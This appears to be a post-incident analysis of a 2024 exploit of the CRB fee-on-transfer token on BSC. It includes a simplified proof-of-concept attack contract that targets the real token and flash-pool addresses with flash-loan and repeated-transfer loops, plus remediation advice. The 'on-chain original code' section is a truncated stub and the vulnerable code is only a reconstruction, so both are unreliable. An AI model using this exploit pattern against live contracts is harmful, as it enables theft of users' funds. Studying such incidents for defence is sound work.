# Crb2 — CRB Balance Manipulation via Repeated Buy/Sell + Direct Transfer Loop Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | Crb2 (CRB Token) |
| **Chain** | BSC |
| **Loss** | ~$15,000 |
| **CRB Token** | [0xee6De822159765daf0Fd72d71529d7ab026ec2f2](https://bscscan.com/address/0xee6De822159765daf0Fd72d71529d7ab026ec2f2) |
| **V3 Flash Pool** | [0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4](https://bscscan.com/address/0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4) |
| **Root Cause** | CRB token's tax/reward mechanism triggered an internal balance accumulation bug via repeated buy/sell cycles (70x) and direct transfers to the contract address (250 + 3000 times), enabling profit extraction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Crb2_exp.sol) |

---

## 1. Vulnerability Overview

The CRB token implements a fee-on-transfer mechanism that applies taxes and rewards on every transfer. The attacker borrowed BUSDT via a V3 flash loan, then executed 70 buy/sell cycles to manipulate the reward pool state. They subsequently triggered an internal balance accumulation bug in the CRB contract by performing 250 and then 3,000 direct transfers to the contract address, acquiring far more CRB than legitimately held and draining approximately $15K.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: balance accumulation bug on repeated transfers
contract CRBToken {
    mapping(address => uint256) private _balances;
    uint256 public rewardPool;

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 tax = amount * taxRate / 100;
        uint256 reward = tax / 2;

        // Reward redistribution when transferring to the contract address
        if (to == address(this)) {
            rewardPool += reward;
            // rewardPool accumulates on repeated calls — no upper bound
            _balances[from] += rewardPool; // ← Bug: accumulated value re-added on every transfer
        }
        _balances[from] -= amount;
        _balances[to] += amount - tax;
    }
}

// ✅ Safe code
function _transfer(address from, address to, uint256 amount) internal {
    uint256 tax = amount * taxRate / 100;
    _balances[from] -= amount;
    _balances[to] += amount - tax;
    // Rewards handled via a separate claim function
    pendingRewards[from] += tax / 2;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Crb2_decompiled.sol
contract Crb2 {
    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] V3 Flash Loan: borrow BUSDT
  │         └─ 0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4
  │
  ├─→ [2] BUSDT → CRB buy × 70 (buy-sell cycles)
  │         └─ Tax/reward state manipulated each cycle
  │
  ├─→ [3] CRB.transfer(address(CRB), amount) × 250
  │         └─ Direct transfer to contract — rewardPool accumulates
  │         └─ _balances re-addition bug triggered
  │
  ├─→ [4] CRB.transfer(address(CRB), amount) × 3000
  │         └─ Further balance accumulation
  │         └─ CRB balance recorded far above actual holdings
  │
  ├─→ [5] Manipulated CRB → BUSDT reverse swap
  │
  ├─→ [6] V3 Flash Loan repayment
  │
  └─→ [7] ~$15K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ICRB {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackContract {
    ICRB constant CRB = ICRB(0xee6De822159765daf0Fd72d71529d7ab026ec2f2);
    IUniswapV3Pool constant flashPool = IUniswapV3Pool(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function testExploit() external {
        // [1] Execute V3 flash loan
        flashPool.flash(address(this), flashAmount, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        // [2] 70 buy-sell cycles — manipulate reward pool state
        for (uint i = 0; i < 70; i++) {
            swapBUSDTtoCRB(smallAmount);
            swapCRBtoBUSDT(CRB.balanceOf(address(this)));
        }

        // [3] 250 direct transfers to CRB contract — trigger bug
        uint256 crbBal = CRB.balanceOf(address(this));
        for (uint i = 0; i < 250; i++) {
            CRB.transfer(address(CRB), crbBal / 250);
        }

        // [4] Additional 3000 transfers — maximize balance accumulation
        crbBal = CRB.balanceOf(address(this));
        for (uint i = 0; i < 3000; i++) {
            CRB.transfer(address(CRB), 1);
        }

        // [5] Accumulated CRB → BUSDT reverse swap
        uint256 finalBal = CRB.balanceOf(address(this));
        swapCRBtoBUSDT(finalBal);

        // [6] Repay flash loan
        BUSDT.transfer(address(flashPool), flashAmount + fee0);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Fee-on-transfer balance accumulation bug (repeated transfer manipulation) |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (repeated transfer + flash loan) |
| **DApp Category** | Fee-on-transfer token |
| **Impact** | Internal balance manipulation → excess CRB acquired → $15K drained |

## 6. Remediation Recommendations

1. **Fix reward re-addition bug**: Remove the `_balances[from] += rewardPool` pattern from the transfer function
2. **Separate reward design**: Distribute rewards via a dedicated `claim()` function instead
3. **Prevent repeated calls**: Limit the number of transfers within a single transaction
4. **Restrict direct transfers to contract address**: Block or apply special handling for transfers to `address(this)`

## 7. Lessons Learned

- In fee-on-transfer tokens, placing reward re-addition logic inside the transfer function can trigger a balance accumulation bug through repeated calls.
- The pattern of manipulating internal reward pool state via direct transfers to the contract address must be mitigated by limiting transfer counts or decoupling reward logic from the transfer function.
- A design that permits 70 + 250 + 3,000 repeated calls within the gas limit makes a profitable attack feasible.